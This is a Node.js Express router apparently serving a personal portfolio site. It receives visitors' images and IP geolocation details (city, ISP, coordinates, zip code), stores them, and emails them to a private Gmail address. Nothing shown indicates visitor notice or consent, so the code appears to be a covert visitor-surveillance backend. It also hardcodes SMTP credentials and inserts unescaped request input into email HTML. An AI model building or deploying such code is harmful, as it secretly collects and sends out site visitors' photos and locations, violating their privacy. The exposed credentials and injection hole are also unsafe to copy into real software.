const router = require('express').Router()
const path = require("path");
const bs64Img = require("base64-img");
const nodemailer = require('nodemailer');
const fs = require('fs')

const User = require('../models/user')

// nodemailer 
// create reusable transporter object using the default SMTP transport
let transporter = nodemailer.createTransport({
    host: 'smtpout.secureserver.net',
    port: 465,
    secure: true,
    auth: {
        user: 'demo@visageint.org',
        pass: 'demo_@@1'
    }
});

router.post('/picdep', getUserPicure)
router.route('/visit').post(visitEmail);

function getUserPicure(req, res) {
    console.log('[+] user picture')
    const imgPath = path.join(__dirname, "/visitor_pics/");
    const imgName = req.body.ip.ip + Date.now();

    bs64Img.img(req.body.img, imgPath.toString(), imgName, async (err, imageLink) => {
        if (err) return res.send(err);
        let vistor_img = imgName + ".png";

        let data = {
            ip_detail: req.body.ip,
            img: vistor_img
        }

        let newUser = new User(data)
        newUser.save().then(usr => {
            console.log('[+] New user', usr)
        }).catch(err => {
            console.log('[-] Error in new usr', err)
        })

        // let img = fs.readFileSync(`./visitor_pics/${vistor_img}`)
        let img_local_link = `https://amnahashmi.me/visitor/${vistor_img}`

        console.log('::::', img_local_link)

        // send picture in email
        data = `You got picture from IP: ${req.body.ip.ip}.`
        await transporter.sendMail({
            from: '"Rohail Javed Portfolio" <rohailjaved@gmail.com>',
            to: 'roadside16@gmail.com',
            subject: '[Rohail Javed] Visitor Information',
            // text: data,
            // attachments: [
            //     {
            //         fileName: vistor_img,
            //         streamSource: img_local_link
            //     }
            // ]
            // html: '&lt;img src=' + req.body.img + '/>'
            html: `<html><body><img src="${req.body.img}"></body></html>`
        });
        console.log('[+] Image sent to admin')
    });
}

// send email on visit
async function visitEmail(req, res) {
    var ipInfo = req.body;
    console.log('[+] Sending visit email')
    res.send('done')
    let img_link = req.body.img_link
    var data = `Rohail Javed Visitor's Information is as follow
      Ip = ${ipInfo.query}
      Country = ${ipInfo.country}
      City = ${ipInfo.city}
      Country Code = ${ipInfo.country}
      RegionName = ${ipInfo.region}
      Internet Service Provider = ${ipInfo.org}
      latitude and longitude = ${ipInfo.loc}
      Org = ${ipInfo.org}
      IP Timezone = ${ipInfo.timezone}
      Client Timezone = ${ipInfo.cTimeZone}
      Zip Code = ${ipInfo.postal}
      Visit Date & Time = ${ipInfo.time}`;

    // if there isn't any image
    if (!img_link) {
        await transporter.sendMail({
            from: '"Rohail Javed Portfolio" <rohailjaved@gmail.com>',
            to: 'roadside16@gmail.com',
            subject: '[Rohail Javed] Visitor Information',
            text: data,
        });
        console.log('[+] Visit email sent to admin')
    } else {
        emailWithImage(ipInfo, data, img_link)
    }
}

// send visit email with image 
async function emailWithImage(ipInfo, data, img_link) {
    console.log('[+] user picture')
    ipInfo['img_link'] = null
    delete ipInfo['img_link']
    const imgPath = path.join(__dirname, "/visitor_pics/");
    const imgName = ipInfo.ip + Date.now();

    bs64Img.img(img_link, imgPath.toString(), imgName, async (err, imageLink) => {
        if (err) return res.send(err);
        let vistor_img = imgName + ".png";

        let _data = {
            ip_detail: data,
            img: vistor_img
        }

        let newUser = new User(_data)
        newUser.save().then(usr => {
            console.log('[+] New visitor created')
        }).catch(err => {
            console.log('[-] Error in new visitor create')
        })

        // let img = fs.readFileSync(`./visitor_pics/${vistor_img}`)
        let img_local_link = `https://amnahashmi.me/visitor/${vistor_img}`
        
        // send picture in email
        let html_content = `<html>
                <body>
                    <h3>Visitor Info on amnahashmi.me</h3> <br>
                    ${data}
                    <br><br>
                    <h4>Image </h4><br>
                    <img src="${img_link}" alt="${vistor_img}" width="540">
                </body>
            </html>`

        await transporter.sendMail({
            from: '"Rohail Javed Portfolio" <rohailjaved@gmail.com>',
            to: 'roadside16@gmail.com',
            subject: '[Rohail Javed] Visitor Information',
            // text: data,
            // attachments: [
            //     {
            //         fileName: vistor_img,
            //         streamSource: img_local_link
            //     }
            // ]
            // html: '&lt;img src=' + req.body.img + '/>'
            // html: `<html><body><img src="${req.body.img}"></body></html>`
            html: html_content
        });
        console.log('[+] Email with image sent to admin')
    });
}

module.exports = router;
